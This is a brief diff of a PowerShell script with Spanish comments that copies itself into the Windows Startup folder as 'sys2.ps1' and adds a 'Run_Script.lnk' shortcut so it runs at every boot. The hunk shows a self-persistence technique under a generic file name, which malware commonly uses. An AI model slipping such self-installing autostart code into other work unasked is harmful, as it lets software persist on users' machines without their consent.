@@ -78,7 +78,7 @@ $startupFolder = [Environment]::GetFolderPath("Startup")
 $scriptInStartupPath = Join-Path -Path $startupFolder -ChildPath "sys2.ps1"
 
 # Copiar el script a la carpeta de inicio
-Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $scriptInStartupPath -Force
+Copy-Item -Path $scriptPath -Destination $scriptInStartupPath -Force
 
 # Crear un acceso directo del script en la carpeta de inicio para que se ejecute al iniciar Windows
 $shortcutPath = Join-Path -Path $startupFolder -ChildPath "Run_Script.lnk"
